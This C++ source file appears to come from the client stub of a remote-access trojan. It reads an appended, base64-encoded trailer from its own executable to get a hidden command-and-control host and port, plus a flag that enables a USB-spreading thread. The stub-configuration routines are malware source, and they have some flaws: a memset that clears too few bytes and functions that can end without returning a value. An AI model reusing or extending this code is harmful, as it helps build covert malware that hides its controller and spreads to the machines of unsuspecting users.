#include "Probe.h"
#include "base64.h"

std::string MyLocation()
{
	TCHAR DIR[MAX_PATH];
	std::string filelocation;
	std::ostringstream err;
	int fpath = GetModuleFileName(NULL, DIR, MAX_PATH);
	if (fpath == 0)
	{
		err.str(""); err.clear();
		err << "Failed to get : " << GetLastError();
		filelocation = err.str();
	}
	else {
		filelocation = DIR;
	}

	return filelocation;
}

std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos)
{
	pos = in.tellg();
	return in.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
}

std::string getLastLine(std::ifstream& in)
{
	std::ifstream::pos_type pos = in.tellg();

	std::ifstream::pos_type lastPos;
	while (in >> std::ws && ignoreline(in, lastPos))
		pos = lastPos;

	in.clear();
	in.seekg(pos);

	std::string line;
	std::getline(in, line);
	return line;
}

std::string GetServerInfo()
{
	char* values[5];
	std::ifstream ME(MyLocation().c_str(), std::ios::binary);
	if (ME.is_open()) {
		std::string hp = getLastLine(ME); // Get Last line from itself
		memset(values, '\0', 5);
		split((char*)hp.c_str(), values, ":"); // Split the last line with [] delimeter

		std::string SERVER = base64_decode(std::string(values[0])); // values 0 contains Server
		std::string PORT = base64_decode(std::string(values[1])); // values 1 contains Port

		return SERVER + ":" + PORT;
	}
}

BOOL GetUSBThreadStatus()
{
	char* values[5];
	std::ifstream ME(MyLocation().c_str(), std::ios::binary);
	if (ME.is_open()) {
		std::string hp = getLastLine(ME); // Get Last line from itself
		memset(values, '\0', 5);
		split((char*)hp.c_str(), values, ":"); // Split the last line with : delimeter

		/*
		* values[0] contains the Server Host
		* values[1] contains the Server Port
		* values[2] contains USB THREAD Status which should be either '1' or '0'.
		*/

		if (strcmp(values[2], "1") == 0) {
			return TRUE;
		}
		else {
			return FALSE;
		}
	}
}